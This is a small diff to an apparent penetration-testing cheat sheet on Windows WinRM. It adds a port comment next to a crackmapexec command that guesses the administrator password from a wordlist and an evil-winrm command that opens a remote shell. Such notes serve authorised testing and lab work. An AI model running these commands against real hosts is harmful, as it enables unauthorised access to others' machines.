@@ -29,5 +29,8 @@ tag: ['windows', 'winrm']
 ```bash
 crackmapexec winrm target -u administrator -p /usr/share/.../unix_passwd.txt
 
+# port 5985
 evil-winrm.rb -u administrator -p 'secretpass' -i target
+
+
 ```
